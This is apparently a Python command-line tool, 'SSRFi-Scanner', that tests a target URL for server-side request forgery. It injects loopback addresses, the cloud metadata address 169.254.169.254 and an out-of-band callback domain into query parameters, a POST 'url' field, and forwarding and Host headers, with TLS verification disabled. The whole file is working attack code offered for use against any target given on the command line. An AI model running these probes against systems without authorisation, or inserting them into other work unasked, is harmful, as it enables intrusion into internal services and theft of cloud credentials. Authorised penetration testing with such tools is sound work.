import requests
import argparse
import urllib.parse

# Common SSRF test endpoints (you can replace with your Burp Collaborator or DNS bin)
SSRF_PAYLOADS = [
    "http://127.0.0.1", "http://localhost", "http://169.254.169.254", 
    "http://0.0.0.0", "http://[::1]", "http://yourdomain.dnslog.cn"
]

HEADERS_TO_TEST = [
    "X-Forwarded-For", "X-Real-IP", "Referer", "Host"
]

def scan_get(url):
    print(f"\n[🔍] Scanning GET with SSRF payloads on: {url}")
    for payload in SSRF_PAYLOADS:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        for param in qs:
            test_qs = qs.copy()
            test_qs[param] = payload
            test_query = urllib.parse.urlencode(test_qs, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
            try:
                r = requests.get(test_url, timeout=7, verify=False)
                print(f"[+] Sent to: {test_url} | Status: {r.status_code}")
            except Exception as e:
                print(f"[!] Error: {e}")

def scan_post(url):
    print(f"\n[🔍] Scanning POST body with SSRF payloads...")
    for payload in SSRF_PAYLOADS:
        data = {"url": payload}
        try:
            r = requests.post(url, data=data, timeout=7, verify=False)
            print(f"[+] POST Payload: {payload} | Status: {r.status_code}")
        except Exception as e:
            print(f"[!] Error: {e}")

def scan_headers(url):
    print(f"\n[🔍] Scanning Headers for SSRF vectors...")
    for payload in SSRF_PAYLOADS:
        for header in HEADERS_TO_TEST:
            try:
                r = requests.get(url, headers={header: payload}, timeout=7, verify=False)
                print(f"[+] Header {header}: {payload} | Status: {r.status_code}")
            except Exception as e:
                print(f"[!] Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="🔭 SSRFi-Scanner — Find SSRF via URL, Headers, POST")
    parser.add_argument("url", help="Target URL (e.g. https://target.com/page?param=test)")
    parser.add_argument("--all", action="store_true", help="Scan GET, POST, and headers (default: GET only)")
    args = parser.parse_args()

    scan_get(args.url)
    if args.all:
        scan_post(args.url)
        scan_headers(args.url)
